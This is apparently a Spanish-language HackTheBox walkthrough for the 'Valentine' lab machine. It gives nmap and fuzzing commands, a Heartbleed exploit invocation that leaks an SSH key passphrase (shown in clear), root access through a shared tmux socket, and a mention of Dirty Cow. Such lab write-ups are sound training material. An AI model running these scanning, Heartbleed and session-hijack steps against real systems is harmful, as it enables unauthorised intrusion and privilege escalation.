# Valentine-HTB


## NMAP

```
batcat -l ruby Scan
sudo nmap  -sS  -p-  -vvv 10.0.160.83 -oG ports
sudo nmap  -sSCV  -p443,80,22  -vvv 10.0.160.83 -oN Scan
```

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/180caebf-94da-41c4-b46b-c64a0b28daf3)


### Scripts por categoria

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/54c3c833-d66a-4152-b9ec-88cbf7524232)

Esto fue lo que me falto al ver un apache viejo no revise que vulnerabilidades tenian esto lo pongo aqui pero realmente ya se me ocurrio hasta despues.

```
locate *.nse | xargs grep "categories" | grep -oP '".*?"' | sort -u # grep -P de regex Perlpattern -o de only match.
nmap --script "vuln and safe" -p443 10.129.71.228
nmap --script "vuln and safe" -p443 10.129.71.228
nmap --script "vuln and safe" -p80 10.129.71.228
```

Con ayuda del servicio SSH pudimos reconocer la vercion del Ubuntu al que nos enfrentamos "Ubuntu 12.04.5 LTSPrecise"


## WhatWeb

Es importante hacer este check tanto para http como https y en este caso dan lo mismo osea son iguales las respuestas.

```
http://10.129.74.37 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.129.74.37], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```

## WFUZZ 

Ya lo que hago es ir armando el comando a mi convenciencia pero es cosa de practica sigue practicando 

```
wfuzz -c --hw=4 --hc 400 -p 127.0.0.1:8080 -X POST -d "FUZZ=eth0" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.0.160.83:1337 # Fuzzed de peticion post paso por proxy.

```

## FFUF

Esta herramienta tienen cosas buenas como la de todas las respuestas seria bueno que le hecharas un ojo

```
ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.75.0:3000/api/FUZZ # la -r es para segur las redirecciones.
```

## Dirbuster


```
dirbuster -u http://valentine.htb/ -t 100 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html 
```

## SSH

Entoncontramos varias rutas.Entontramos una key tanto para encode y decode que al parecer solo era un base64 nada complejo


![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/f88dc834-cf44-40eb-9ce9-c1007091fe6d)


![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/8f0e59df-d144-447e-a89a-d0e8c41f847c)

En donde la key luce asi

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/f073ba14-0dd0-4ca6-88f5-7009a9b095e1)

Me di cuenta que esto parece hex decimal vamos a combertirlo en ascii.

```
cat key | sed 's/ \+//g' | xxd -r -p > id_rsa

```

Pero ahora nos damos cuenta que la id_rsa esta protegida con un password


![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/14ae66cb-447a-4992-a30f-bbf4cd4c8427)



## Terminal Shortcuts

```

Terminal 

CTRL + A #Ir al incio
CTRL + E # Ir al final 
ALT + B # Una palabra antes (Before)
ALT + F # Para adelante

Man 

CTRl + Shift #Buscar
n # para buscar adelante
shift + n ( osea N) # para buscar hacia atras
g Ir a la primera linea del manual man

TMUX

CTRL + B Shift + ! # Para un panel convertirlo en una ventana nueva.
CTRL + B Shift + [ # Para copiar se hace
Copy mode CTRL + Space # Selecciona 
CTRL + W # Eso es copia
CTRL + B + SHIFT + ] # pega lo copiado
```






## HeartBleed

5![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/39f7244d-1973-49c3-b9a6-a47c286cfc89)


Nos damos cuenta que es un servidor viejo vulnerable a heartbleed entonces pues probamos el exploit y nos trae una cadena en base64 que es el paass de la key id_rsa. Los permisos de una id_rsa son los 600 que solo propietario pueda leer y escribir.

```
python2 32764.py 10.129.71.228 -p 443 | grep -v "00"

```

Y obtenemos una password "heartbleedbelievethehype" Como adivinamos el usuario tenemos varios caminos 1 enumerar usuario con el explorit pero esto tarda mucho que sea nuestra ultima alternativa 2 de lo que vamos encontrando en la pagina pues ir poniendo palabras por ejemplo hype que dice hype_key podria ser una pista asi como la imagen es una pista podriamos subirla a google para ver que onda.


## RCE

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/478c7967-2a8a-4dde-8152-1de77332c7a1)


Con  la id_rsa ( que esta protegida con pass)


```
## PASS id_rsa

heartbleedbelievethehype
```

No me dejaba conectarme porque esta deprecated. Como no queria limpiar la consola hicimos un export TERM=xterm. 

> Most likely your SSH client is using ssh-rsa (RSA+SHA1) and your server has that signature algorithm disabled. SHA-1 is vulnerable and OpenSSH disabled that signature algorithm in version 8.8 (2021-09-26).

Lo venci asi:

> https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/0a5ac691-f393-49d2-819b-d5a10d447595)

Efectivamente es Ubuntu 12 

## Privlege escalation

Se deberia de checar el Kernel de linux a ver si no hay exploit(si hay), los cron jobs,los archivos con SUID, exploits para sudo, los puertos expuestos localmente y los procesos que estan ejecutandose.

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/2ec995c6-1431-42c5-84b8-e30380419397)

Existia una sesion de tmux que ejecutaba root

```
tmux -S /.devs/dev_sess


```

Ojo esto solo funciona para versiones de tmux muy antiguaas

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/37e1b6c2-ee1a-4e44-a78f-4a904dbc3926)



### Dirty Cow

Es un exploit del kernel de linux. En el searchsploit dice que el Kernel de Linux es vulnerabel en un rando inclusivo de 2.6.22 a kernel menor a 3.9. En el mismo exploit te dice como compilarlo.

![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/813fc15c-a938-44c4-8b97-e882aeb4ecf8)


![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/142ca143-68c2-458e-b75d-02191a4c9d4a)







